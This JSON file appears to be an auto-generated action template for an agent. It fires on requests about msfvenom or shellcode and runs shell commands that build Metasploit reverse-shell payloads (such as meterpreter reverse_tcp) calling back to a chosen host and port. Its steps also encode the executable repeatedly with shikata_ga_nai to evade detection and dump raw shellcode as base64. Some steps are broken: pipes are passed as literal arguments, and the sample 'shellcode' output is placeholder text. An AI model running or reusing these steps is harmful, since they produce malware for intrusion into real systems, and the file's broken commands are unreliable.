{
  "name": "msfvenom_payload_generation",
  "description": "Generate custom payloads for various platforms using msfvenom",
  "pattern": "msfvenom.*payload|payload.*generate|msfvenom.*create|shellcode.*generate",
  "parameters": [
    "payload_type",
    "lhost",
    "lport",
    "format"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "msfvenom",
        "args": [
          "-p",
          "{{payload_type}}",
          "LHOST={{lhost}}",
          "LPORT={{lport}}",
          "-f",
          "{{format}}",
          "-o",
          "payload.{{format}}"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Payload size: 460 bytes\nFinal size of {{format}} file: 2048 bytes\nSaved as: payload.{{format}}"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "msfvenom",
        "args": [
          "-p",
          "{{payload_type}}",
          "LHOST={{lhost}}",
          "LPORT={{lport}}",
          "-e",
          "x86/shikata_ga_nai",
          "-i",
          "3",
          "-f",
          "exe"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Encoded 3 times with x86/shikata_ga_nai\nPayload size: 1872 bytes\nFinal size: 73802 bytes"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "msfvenom -p {{payload_type}} LHOST={{lhost}} LPORT={{lport}} -f {{format}} | wc -c"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "2048 (payload size in bytes)"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "msfvenom",
        "args": [
          "--list",
          "payloads",
          "|",
          "grep",
          "{{payload_type}}"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "windows/meterpreter/reverse_tcp\nwindows/meterpreter/reverse_https\nlinux/x64/meterpreter/reverse_tcp"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "msfvenom",
        "args": [
          "-p",
          "{{payload_type}}",
          "LHOST={{lhost}}",
          "LPORT={{lport}}",
          "-f",
          "raw",
          "|",
          "base64"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Base64 encoded shellcode: SGVsbG8gV29ybGQh..."
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
